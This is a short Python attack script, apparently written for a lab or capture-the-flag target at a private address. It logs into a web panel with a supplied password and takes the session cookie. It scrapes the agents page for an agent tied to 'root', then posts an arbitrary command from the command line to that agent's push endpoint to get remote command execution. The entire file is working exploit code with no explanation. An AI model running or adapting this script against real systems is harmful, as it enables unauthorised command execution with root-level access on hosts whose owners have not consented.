import requests
from lxml import html
import sys

password = sys.argv[1]
command = sys.argv[2]

plus_command = command.replace(" ", '+')
plus_command = "cmdline=" + plus_command
len_command = str(len(plus_command))

url = 'http://172.16.231.3:8080'
login_url = url + '/login'

mydata=password + '=' + password
len_password = str(len(mydata))


headers = {
		"Host": "172.16.231.3:8080",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "http://172.16.231.3:8080/login",
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": len_password,
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1"
}

session = requests.Session()
response = session.post(login_url,
		data=mydata,
		headers=headers)
dict = session.cookies.get_dict()
cookie = dict['session']
print(cookie)

session_with_cookie = 'session=' + cookie

headers = {
		"Host": "172.16.231.3:8080",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "http://172.16.231.3:8080",
		"Cookie": session_with_cookie,
		"Connection": "close",
		"Upgrade-Insecure-Requests": "1"
}

r = requests.get(url + '/agents', headers=headers)
tree = html.fromstring(r.content)
agents = tree.xpath('/html/body//a[contains(@href, "root")]/@href')
agents_name = agents[0].replace("/agents", "")
command_url = url + '/api' + agents_name + '/push'
print(command_url)
referer_url = url + agents[0]
print(referer_url)

headers = {
		"Host": "172.16.231.3:8080",
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Referer": referer_url,
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": len_command,
		"Cookie": session_with_cookie,
		"Connection": "keep-alive",
		"Upgrade-Insecure-Requests": "1"
}

command_request = requests.post(command_url, data=plus_command, headers=headers)
